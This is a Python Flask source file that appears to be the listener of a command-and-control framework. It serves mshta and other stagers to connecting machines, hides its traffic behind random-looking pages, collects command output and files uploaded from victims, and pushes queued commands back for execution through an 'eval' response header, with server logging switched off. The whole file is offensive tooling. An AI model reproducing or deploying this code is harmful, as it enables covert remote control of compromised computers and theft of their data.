import logging
import os
import urllib.parse as parse

from connect import color, connection, loader, util
from flask import Flask, make_response, render_template, request, send_file

app = Flask(__name__)

checkin_uri = f'/{util.generate_id()}'

@app.route('/<format_id>', methods=['GET'])
def serve_stagers(format_id):
    remote_addr = request.remote_addr
    if format_id not in engine.STAGERS.keys():
        return render_template('connection_template.html', random_data=util.random_data)
    color.information(f'{engine.STAGERS[format_id].format} file requested ({remote_addr})')
    connection_id = util.generate_id()
    connection = engine.create_connection(connection_id, engine.STAGERS[format_id])
    connection.system_information['ip'] = remote_addr
    if engine.connections[connection_id].stager.format == 'mshta':
        code = parse.quote(render_template(f'stagers/mshta_code',
                checkin_uri = checkin_uri,
                connection_id = connection_id,
                variables = engine.STAGERS[format_id].variables))
    return render_template(
        f'stagers/{engine.connections[connection_id].stager.format}',
        checkin_uri = checkin_uri,
        connection_id = connection_id,
        variables = engine.STAGERS[format_id].variables,
        code = code
    )

@app.route(f'{checkin_uri}', methods=['POST'])
def checkin():
    data = request.get_data()
    color.verbose(data)
    response = make_response(render_template('connection_template.html', random_data=util.random_data))
    try:
        connection = engine.retrieve_connection(request.headers['Connection-ID'])
    except:
        return response
    connection.check_in()
    internet_addr = connection.system_information['ip']
    if data:
        if request.headers['mimetype'] == 'text/plain':
            color.normal('\n')
            color.information(f'Results recieved from ({internet_addr}):')
            color.normal(str(data,'utf-8'))
        else:
            filename = util.generate_str()
            color.normal('\n')
            color.information(f'File recieved from ({internet_addr}) saving to downloads/{filename}.')
            loader.download(data, filename)
    if connection.job_queue:
        job = connection.job_queue.pop(0)
        if job.type == 'function':
            response.headers['eval'] = job.data
            return response
        if job.type == 'command':
            command = job.data[0]
            if len(job.data) == 1:
                response.headers['eval'] = command + '()'
                return response
            arguments = job.data[1:]
            if 'file:' in arguments[0]:
                filename = arguments[0].split(':')[1]
                arguments[0] = 'response.ResponseBody'
                try:
                    response = make_response(send_file(f'uploads/{filename}'))
                except:
                    color.information('File does not exist.')
                    return response
            arguments = ','.join(arguments)
            response.headers['eval'] = parse.quote(f'{command}({arguments})')
            return response
    return response

def run(ip, port):
    os.environ['WERKZEUG_RUN_MAIN'] = 'true'
    log = logging.getLogger('werkzeug')
    log.disabled = True
    app.config['TEMPLATES_AUTO_RELOAD'] = True
    try:
        app.run(host=ip, port=port)
    except:
        color.information(f'Error starting server')
        return
    return
